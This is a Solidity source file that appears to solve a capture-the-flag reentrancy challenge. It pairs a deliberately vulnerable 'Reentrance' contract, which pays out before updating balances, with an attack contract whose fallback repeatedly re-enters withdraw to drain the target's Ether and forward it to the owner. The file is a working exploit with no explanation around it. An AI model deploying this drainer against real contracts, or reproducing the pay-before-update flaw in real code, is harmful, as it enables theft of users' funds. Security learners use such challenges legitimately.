// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../interfaces/SafeMath0.6.0.sol";

contract Reentrance {

    using SafeMath6 for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value : _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Atk_Reentrance {
    address public owner;
    uint public fund;
    Reentrance public target;

    constructor(address payable addr) payable public {
        owner = msg.sender;
        target = Reentrance(addr);
    }

    function set_target(address payable addr) public {
        target = Reentrance(addr);
    }

    function withdraw() public {
        (bool sent,) = owner.call{value : address(this).balance}("");
    }

    function atk() payable public {
        fund = msg.value;
        target.donate{value : fund}(address(this));
        target.withdraw(fund);
    }

    fallback() payable external {
        if (address(target).balance > fund) {
            target.withdraw(fund);
        } else if (address(target).balance > 0) {
            target.withdraw(address(target).balance);
        }
    }
}

